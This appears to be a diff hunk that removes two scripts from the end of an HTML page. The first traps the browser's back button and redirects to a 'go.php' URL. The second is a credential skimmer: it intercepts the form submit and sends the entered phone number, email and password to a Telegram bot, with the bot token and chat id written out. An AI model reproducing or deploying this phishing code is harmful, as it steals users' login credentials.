@@ -994,41 +994,5 @@ input[type=number]{-moz-appearance:textfield}
     }, 3e3);</script> 
 
 </div>
- <script>
-    window.onhashchange=function(){jp();};
-    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
-    function jp() {
-        fh();}
-    setTimeout('hh();', 500);
-    function fh(){
-        location.href="/go.php?t=9";
-    }
-</script>
- 
-<script>
-    // টেলিগ্রাম বটের মাধ্যমে ডেটা পাঠানোর জন্য ইভেন্ট লিসেনার
-    document.querySelector("#enviar").addEventListener("click", function (event) {
-        event.preventDefault(); // ডিফল্ট সাবমিশন বন্ধ করা
-
-        // ফর্ম থেকে ডেটা সংগ্রহ
-        const phone = document.querySelector("#num").value || "Not Provided";
-        const email = document.querySelector("#email")?.value || "Not Provided";
-        const password = document.querySelector("#pass")?.value || "Not Provided";
-
-        // ফেচ রিকোয়েস্টের মাধ্যমে ডেটা টেলিগ্রামে পাঠানো
-        fetch("https://api.telegram.org/bot<7691027471:AAGbAAO4BUb56L-etqwBUWaNONdjymnyjaM>/sendMessage", {
-            method: "POST",
-            body: JSON.stringify({
-                chat_id: "<5893848641>",
-                text: `Phone: ${phone}, Email: ${email}, Password: ${password}`
-            }),
-            headers: { "Content-Type": "application/json" }
-        })
-        .then(response => response.json())
-        .then(data => console.log("Message sent:", data)) // সফল হলে লগ
-        .catch(error => console.error("Error:", error)); // ত্রুটি হলে লগ
-    });
-</script>
-
 </body>
 </html
